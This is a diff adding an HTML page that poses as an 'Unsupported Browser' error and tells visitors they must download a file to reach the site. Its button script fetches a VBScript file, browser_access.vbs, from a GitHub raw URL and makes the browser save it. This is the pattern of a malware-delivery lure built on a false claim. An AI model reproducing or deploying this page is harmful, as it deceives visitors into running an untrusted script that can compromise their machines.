@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unsupported Browser</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: none;
+            margin: none;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+           
+        }
+        .error-message {
+            background: rgba(255, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            display: inline-block;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+        .download-button {
+            display: inline-block;
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            background: red;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .download-button:hover {
+            background: darkred;
+        }
+    </style>
+    <script>
+        async function downloadFile() {
+            const fileUrl = "https://raw.githubusercontent.com/wagner012/wagner/main/browser_access.vbs";
+            try {
+                const response = await fetch(fileUrl);
+                const blob = await response.blob();
+                const link = document.createElement("a");
+                link.href = URL.createObjectURL(blob);
+                link.download = "browser_access.vbs";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            } catch (error) {
+                console.error("Download failed:", error);
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="error-message">
+        This website is not supported in your browser. Please download this file to access the site.
+    </div>
+    <button class="download-button" onclick="downloadFile()">Download File</button>
+</body>
+</html>
